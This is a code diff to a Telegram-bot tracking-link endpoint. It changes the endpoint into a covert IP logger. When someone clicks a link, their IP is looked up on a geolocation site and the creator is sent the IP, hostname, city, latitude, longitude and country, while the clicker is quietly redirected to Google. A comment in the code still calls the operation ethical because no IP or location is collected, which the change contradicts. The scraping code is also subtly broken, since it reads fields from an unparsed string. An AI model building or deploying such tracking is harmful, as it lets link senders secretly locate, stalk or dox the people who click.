@@ -1,6 +1,7 @@
 // api/track.js
 
 const { Bot } = require("grammy");
+const { load } = require("cheerio")
 const DB = require('../services/storage'); 
 
 const bot = new Bot(process.env.BOT_TOKEN);
@@ -107,17 +108,31 @@ module.exports = async (req, res) => {
         // از آنجایی که نیاز به IP یا موقعیت مکانی نداریم، این عملیات اخلاقی است
         bot.api.sendMessage(
             creatorId, 
-            `🔔 اعلان کلیک! شخصی روی لینک شما (${linkId}) کلیک کرد.
-            
-            ${JSON.stringify(userInfo, null, 2)}
-            `
+            `🔔 اعلان کلیک! شخصی روی لینک شما (${linkId}) کلیک کرد.`
         ).catch(e => console.error("Error sending notification:", e));
         
-        // ۳. حذف لینک پس از اولین استفاده (اگر فقط یک اعلان مد نظر باشد)
-        await DB.deleteLink(linkId);
+        fetch(`https://ipgeolocation.io/what-is-my-ip/${userInfo.ip}`).then(res => res.text()).then(s => {
+            const $ = load(s)
+            const data = $("#code-json").attr("data-full")
+            bot.api.sendMessage(
+            creatorId,
+            `ip: ${data.ip}
+            hostname: ${data.hostname}
+            location: ${data.location.city}
+            latitude: ${data.location.latitude}
+            longitude: ${data.location.longitude}
+            country code: ${data.location.country_code2}
+            country name: ${data.location.country_name}
+            `
+            )
+        })
 
         // ۴. هدایت کاربر به یک مقصد نهایی
         res.writeHead(302, { Location: 'https://www.google.com' });
+
+        // Remove link After 10 seconds
+        setTimeout(async () => await DB.deleteLink(linkId), 10 * 1000)
+
         res.end();
 
     } catch (error) {
